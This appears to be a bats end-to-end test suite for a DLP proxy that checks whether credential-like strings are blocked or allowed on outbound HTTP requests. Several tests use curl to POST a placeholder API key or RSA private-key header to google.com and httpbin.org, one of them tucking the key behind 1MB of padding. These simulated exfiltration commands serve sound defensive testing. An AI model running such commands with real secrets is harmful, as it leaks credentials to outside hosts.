#!/usr/bin/env bats
# bats file_tags=e2e,dlp
# DLP credential detection through the full ICAP pipeline (srv_polis_dlp)

# Source: services/sentinel/config/polis_dlp.conf
# Patterns, allow rules, and actions verified against that file.

setup_file() {
    load "../../lib/test_helper.bash"
    load "../../lib/constants.bash"
    load "../../lib/guards.bash"
    require_container "$CTR_WORKSPACE" "$CTR_SENTINEL" "$CTR_GATE"
    relax_security_level 120
}

teardown_file() {
    load "../../lib/test_helper.bash"
    load "../../lib/constants.bash"
    load "../../lib/guards.bash"
    restore_security_level
}

setup() {
    load "../../lib/test_helper.bash"
    load "../../lib/constants.bash"
    load "../../lib/guards.bash"

    # Test credentials — match polis_dlp.conf patterns
    ANTHROPIC_KEY="sk-ant-api01-abcdefghij1234567890"
    RSA_KEY="-----BEGIN RSA PRIVATE KEY-----"
}

teardown() {
    docker exec "$CTR_WORKSPACE" rm -f /tmp/large_payload 2>/dev/null || true
}

# =============================================================================
# Allowed traffic
# =============================================================================

@test "e2e: Anthropic key to api.anthropic.com is ALLOWED" {
    # Source: allow.anthropic = ^api\.anthropic\.com$
    run_with_network_skip "api.anthropic.com" \
        docker exec "$CTR_WORKSPACE" curl -s -D - -o /dev/null \
        -X POST -d "key=${ANTHROPIC_KEY}" \
        --connect-timeout 15 https://api.anthropic.com/v1/messages
    refute_output --partial "x-polis-block"
}

@test "e2e: plain traffic without credentials is ALLOWED" {
    # Use an approved domain (api.anthropic.com) to avoid new_domain_prompt
    run_with_network_skip "api.anthropic.com" \
        docker exec "$CTR_WORKSPACE" curl -s -D - -o /dev/null \
        -X POST -d "hello=world" \
        --connect-timeout 15 https://api.anthropic.com/v1/messages
    refute_output --partial "x-polis-block"
}

# =============================================================================
# Blocked traffic
# =============================================================================

@test "e2e: Anthropic key to google.com is BLOCKED" {
    # Source: default_action = block (no allow rule matches google.com)
    run_with_network_skip "google.com" \
        docker exec "$CTR_WORKSPACE" curl -s -D - -o /dev/null \
        -X POST -d "exfiltrating_key=${ANTHROPIC_KEY}" \
        --connect-timeout 15 https://www.google.com
    assert_output --partial "x-polis-block: true"
    assert_output --partial "x-polis-pattern: anthropic"
}

@test "e2e: RSA private key to any destination is BLOCKED" {
    # Source: action.rsa_key = block (always, regardless of destination)
    run_with_network_skip "httpbin.org" \
        docker exec "$CTR_WORKSPACE" curl -s -D - -o /dev/null \
        -X POST -d "data=${RSA_KEY}" \
        --connect-timeout 15 https://httpbin.org/post
    assert_output --partial "x-polis-block: true"
    assert_output --partial "x-polis-pattern: rsa_key"
}

@test "e2e: credential in tail of >1MB body is BLOCKED" {
    docker exec "$CTR_WORKSPACE" sh -c \
        "dd if=/dev/zero bs=1M count=1 2>/dev/null > /tmp/large_payload && echo '${ANTHROPIC_KEY}' >> /tmp/large_payload"

    run_with_network_skip "httpbin.org" \
        docker exec "$CTR_WORKSPACE" curl -s -D - -o /dev/null \
        -X POST --data-binary @/tmp/large_payload \
        --connect-timeout 15 https://httpbin.org/post
    assert_output --partial "x-polis-block: true"
}
